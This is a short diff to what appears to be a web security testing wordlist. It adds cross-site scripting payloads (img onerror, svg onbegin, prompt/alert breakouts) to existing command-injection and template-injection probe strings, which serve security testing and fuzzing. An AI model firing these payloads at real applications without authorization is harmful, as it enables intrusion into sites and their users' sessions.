@@ -16,7 +16,13 @@ http://
 |ping -c 30 127.0.0.1
 ~'!@#$%^&?*:()[]|\-_+,./
 ${{<%[%'"{{%\
-<s>Lucid
+<s>Electric_Yellow
 "><img src=x onerror=alert(document.domain)>
 &#x3c;script&#x3e;&#x61;lert(document.domain)&#x3c;&#x2f;script&#x3e;
 {{8*8}}[[5*5]]${{7*7}}#{{3*7}}<%= 9*9 %>
+\"-alert(1)}//
+"-prompt(69)-"
+'-prompt(69)-'
+<img src=1 onerror=alert(1)>
+"><svg><animatetransform onbegin=alert(1)>
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"Electric_Yellow
